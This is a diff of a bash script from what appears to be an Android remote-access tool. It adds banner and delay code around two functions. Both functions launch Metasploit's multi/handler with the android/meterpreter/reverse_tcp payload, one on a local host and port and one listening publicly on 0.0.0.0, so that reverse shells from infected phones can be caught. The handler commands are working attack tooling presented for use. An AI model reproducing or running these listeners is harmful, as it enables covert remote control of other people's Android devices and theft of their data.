@@ -257,15 +257,47 @@ open_youtube_channel() {
 
 # Open Local Session listener
 start_internal_listener() {
+    sleep 1s 
+    clear 
+    echo -e $LGreen '';figlet -c -f slant "Starting ..."
+    sleep 0.5s
+    echo ''
+    sleep 0.5s
+    echo -e $LGreen "Starting Local Sission Listener ..."
+    echo ''
+    sleep 0.5
+    echo ''
     msfconsole -q -x "use exploit/multi/handler; set PAYLOAD android/meterpreter/reverse_tcp; set LHOST $lhost1; set LPORT $lport1; run"
     echo -e "${GREEN}[+] The Local Session Listener Was Started Successfully (^_^) ${NC}"
 }
 
 # Open Public Sission Listener 
 start_external_listener() {
+    sleep 1s 
+    clear 
+    echo -e $LGreen '';figlet -c -f slant "Starting ..."
+    sleep 0.5s
+    echo ''
+    sleep 0.5s
+    echo ''
+    sleep 0.5
+    echo ''
     read -p "Please Enter LHOST : " lhost
+    sleep 0.5s
+    echo ''
+    sleep 0.5s
     read -p "Please Enter LPORT : " lport
-    msfconsole -q -x "use exploit/multi/handler; set PAYLOAD android/meterpreter/reverse_tcp; set LHOST $lhost; set LPORT $lport; run"
+    sleep 1s
+    clear 
+    echo -e $LGreen '';figlet -c -f slant "Starting ..."
+    sleep 0.5s
+    echo ''
+    sleep 0.5s
+    echo -e $LGreen "Starting Puplic Sission Listener ..."
+    echo ''
+    sleep 0.5
+    echo ''
+    msfconsole -q -x "use exploit/multi/handler; set PAYLOAD android/meterpreter/reverse_tcp; set LHOST 0.0.0.0; set LPORT $lport; run"
     echo -e "${GREEN}[+] The Public Session Listener Was Started Successfully (^_^) .${NC}"
 }
 
